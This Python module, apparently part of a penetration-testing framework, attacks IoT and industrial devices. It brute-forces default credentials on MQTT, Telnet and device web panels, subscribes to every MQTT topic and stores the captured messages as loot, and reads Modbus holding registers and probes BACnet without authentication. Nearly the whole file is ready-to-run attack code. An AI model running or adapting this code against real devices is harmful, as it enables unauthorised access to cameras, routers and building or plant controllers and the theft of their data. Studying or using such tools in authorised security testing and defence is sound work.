"""Default credentials, MQTT subscribe/publish, Modbus enumeration."""

from __future__ import annotations

import socket
import struct
import threading
import time
from typing import Any, Dict, List

from aegis.models import AttackResult, Credential, EngagementContext, OpenPort
from aegis.logger import log
from aegis.modules.base import BaseModule
from aegis.utils.network import tcp_connect
from aegis.data.ports import IOT_DEFAULT_CREDS

try:
    import paho.mqtt.client as mqtt_client
    PAHO_MQTT = True
except ImportError:
    PAHO_MQTT = False

try:
    import requests as _req_lib
    REQUESTS = True
except ImportError:
    REQUESTS = False


class IoTModule(BaseModule):
    """Default credentials, MQTT subscribe/publish, Modbus enumeration."""

    name = "iot"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        results: List[AttackResult] = []
        for op in ctx.open_ports:
            if op.port == 1883 or op.port == 8883:
                results.extend(self._mqtt_attack(ctx, op))
            elif op.port == 502:
                results.extend(self._modbus_enum(ctx, op))
            elif op.port == 47808:
                results.extend(self._bacnet_enum(ctx, op))
            elif op.port in (80, 8080, 443, 8443):
                results.extend(self._iot_web_creds(ctx, op))
            elif op.port == 23:
                results.extend(self._telnet_default(ctx, op))
        return results

    # ------------------------------------------------------------------
    # MQTT
    # ------------------------------------------------------------------

    def _mqtt_attack(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not PAHO_MQTT:
            return [AttackResult("iot", "mqtt", "PARTIAL", host=op.host, port=op.port,
                                 notes="Install paho-mqtt for MQTT attacks")]
        results: List[AttackResult] = []
        collected_msgs: List[Dict[str, Any]] = []
        connected = threading.Event()
        lock = threading.Lock()

        def on_connect(client: Any, userdata: Any, flags: Any, rc: int) -> None:
            if rc == 0:
                connected.set()
                client.subscribe("#")  # Subscribe to ALL topics
                log(f"[IoT/MQTT] Connected to {op.host}:{op.port} — subscribing to #", "CRIT")
            else:
                connected.set()  # Signal even on failure

        def on_message(client: Any, userdata: Any, msg: Any) -> None:
            with lock:
                collected_msgs.append({
                    "topic": msg.topic,
                    "payload": msg.payload.decode("utf-8", errors="replace")[:200],
                    "qos": msg.qos,
                })

        for user, passwd in [("", ""), ("guest", "guest"), ("admin", "admin"), ("mqtt", "mqtt")]:
            try:
                client = mqtt_client.Client()
                client.on_connect = on_connect
                client.on_message = on_message
                if user:
                    client.username_pw_set(user, passwd)
                client.connect(op.host, op.port, keepalive=10)
                client.loop_start()
                connected.wait(timeout=ctx.timeout)
                if connected.is_set() and client.is_connected():
                    time.sleep(3)  # Collect messages for 3 seconds
                    client.loop_stop()
                    client.disconnect()
                    ctx.credentials.append(Credential(
                        "MQTT", op.host, op.port, user, passwd,
                        notes=f"MQTT broker accessible. Subscribed to # — captured {len(collected_msgs)} messages"
                    ))
                    ctx.loot.setdefault("mqtt", {})[op.host] = {
                        "credentials": (user, passwd),
                        "messages": collected_msgs[:20],
                    }
                    results.append(AttackResult(
                        "iot", "mqtt_subscribe", "SUCCESS",
                        host=op.host, port=op.port, severity="HIGH",
                        data={"user": user, "pass": passwd,
                              "messages_captured": len(collected_msgs),
                              "topics": list({m["topic"] for m in collected_msgs})[:10]},
                        notes=f"MQTT '{op.host}:{op.port}' open. Subscribed to all topics. "
                              f"{len(collected_msgs)} messages captured.",
                    ))
                    break
            except Exception:
                pass
        if not results:
            results.append(AttackResult("iot", "mqtt_attack", "FAILED",
                                        host=op.host, port=op.port,
                                        notes="All MQTT credential attempts failed"))
        return results

    # ------------------------------------------------------------------
    # Modbus
    # ------------------------------------------------------------------

    def _modbus_enum(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        # Modbus/TCP has no authentication -- read holding registers
        results: List[AttackResult] = []
        try:
            s = tcp_connect(op.host, op.port, ctx.timeout)
            if not s:
                return results
            # Modbus Read Holding Registers: Function Code 0x03
            # Transaction ID=1, Protocol=0, Length=6, Unit=1, FC=3, Start=0, Count=10
            request = b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0a"
            s.sendall(request)
            s.settimeout(ctx.timeout)
            resp = s.recv(256)
            s.close()
            if len(resp) > 8 and resp[7] == 0x03:
                byte_count = resp[8]
                registers: List[int] = []
                for i in range(0, byte_count, 2):
                    if 9 + i + 1 < len(resp):
                        reg = struct.unpack(">H", resp[9 + i:9 + i + 2])[0]
                        registers.append(reg)
                log(f"[IoT/Modbus] Unauthenticated Modbus on {op.host}:{op.port}! Registers: {registers}", "CRIT")
                results.append(AttackResult(
                    "iot", "modbus_read", "SUCCESS",
                    host=op.host, port=op.port, severity="HIGH",
                    data={"registers": registers},
                    notes=f"Modbus/TCP with no auth on {op.host}:{op.port}. Holding registers readable.",
                ))
            else:
                results.append(AttackResult("iot", "modbus_probe", "PARTIAL",
                                            host=op.host, port=op.port,
                                            notes="Modbus responded but register read returned unexpected response"))
        except Exception as exc:
            results.append(AttackResult("iot", "modbus_read", "FAILED",
                                        host=op.host, port=op.port, notes=str(exc)))
        return results

    # ------------------------------------------------------------------
    # BACnet
    # ------------------------------------------------------------------

    def _bacnet_enum(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results: List[AttackResult] = []
        try:
            # BACnet Who-Is broadcast (UDP)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(ctx.timeout)
            # BACnet Who-Is APDU
            bacnet_whois = bytes.fromhex("810b000c0120ffff00ff1008")
            s.sendto(bacnet_whois, (op.host, 47808))
            resp, addr = s.recvfrom(1024)
            s.close()
            if resp:
                log(f"[IoT/BACnet] BACnet device responded on {op.host}:47808!", "CRIT")
                results.append(AttackResult(
                    "iot", "bacnet_discovery", "SUCCESS",
                    host=op.host, port=47808, severity="MEDIUM",
                    data={"raw_response": resp.hex()},
                    notes=f"BACnet/IP device at {op.host}:47808 — building automation system accessible",
                ))
        except Exception:
            pass
        return results

    # ------------------------------------------------------------------
    # IoT web default credentials
    # ------------------------------------------------------------------

    def _iot_web_creds(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not REQUESTS:
            return []
        results: List[AttackResult] = []
        proto = "https" if op.port in (443, 8443) else "http"
        base = f"{proto}://{op.host}:{op.port}"
        # IoT admin panel paths
        iot_paths = ["/", "/admin", "/cgi-bin/luci", "/webman/", "/ui/",
                     "/HNAP1/", "/eng/", "/sys.html", "/setup.cgi"]
        for path in iot_paths[:4]:
            url = base + path
            try:
                resp = _req_lib.get(url, timeout=ctx.timeout, verify=False, allow_redirects=False)
                if resp.status_code == 200 and any(
                    kw in resp.text.lower() for kw in
                    ["router", "gateway", "camera", "dvr", "nvr", "plc", "scada",
                     "tp-link", "d-link", "netgear", "hikvision", "dahua", "axis"]
                ):
                    for user, passwd in IOT_DEFAULT_CREDS["HTTP"]:
                        r = _req_lib.get(url, auth=(user, passwd), timeout=ctx.timeout, verify=False)
                        if r.status_code == 200 and "login" not in r.url.lower():
                            log(f"[IoT/Web] Default creds on IoT device {url} ({user}:{passwd})", "CRIT")
                            ctx.credentials.append(
                                Credential("IoT-HTTP", op.host, op.port, user, passwd,
                                           notes=f"IoT device default creds on {url}"))
                            results.append(AttackResult(
                                "iot", "iot_default_creds", "SUCCESS",
                                host=op.host, port=op.port, severity="CRITICAL",
                                data={"url": url, "user": user, "pass": passwd},
                                notes=f"IoT device admin panel unlocked: {url} | {user}:{passwd}",
                            ))
                            break
            except Exception:
                pass
        return results

    # ------------------------------------------------------------------
    # Telnet default credentials
    # ------------------------------------------------------------------

    def _telnet_default(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results: List[AttackResult] = []
        try:
            s = tcp_connect(op.host, op.port, ctx.timeout)
            if not s:
                return results
            s.settimeout(ctx.timeout)
            banner = s.recv(1024).decode("utf-8", errors="replace")
            for user, passwd in IOT_DEFAULT_CREDS["Telnet"]:
                try:
                    if "login" in banner.lower() or "username" in banner.lower():
                        s.sendall((user + "\n").encode())
                        time.sleep(0.5)
                        resp = s.recv(1024).decode("utf-8", errors="replace")
                        if "password" in resp.lower():
                            s.sendall((passwd + "\n").encode())
                            time.sleep(0.5)
                            resp2 = s.recv(1024).decode("utf-8", errors="replace")
                            if any(ind in resp2.lower() for ind in ["#", "$", ">", "welcome", "last login"]):
                                log(f"[IoT/Telnet] Default creds work on {op.host}:{op.port} ({user}:{passwd})", "CRIT")
                                ctx.credentials.append(
                                    Credential("Telnet", op.host, op.port, user, passwd))
                                results.append(AttackResult(
                                    "iot", "telnet_default", "SUCCESS",
                                    host=op.host, port=op.port, severity="CRITICAL",
                                    data={"user": user, "pass": passwd, "banner": banner[:100]},
                                    notes=f"Telnet default creds: {user}:{passwd} on {op.host}",
                                ))
                                break
                except Exception:
                    pass
            s.close()
        except Exception:
            pass
        return results
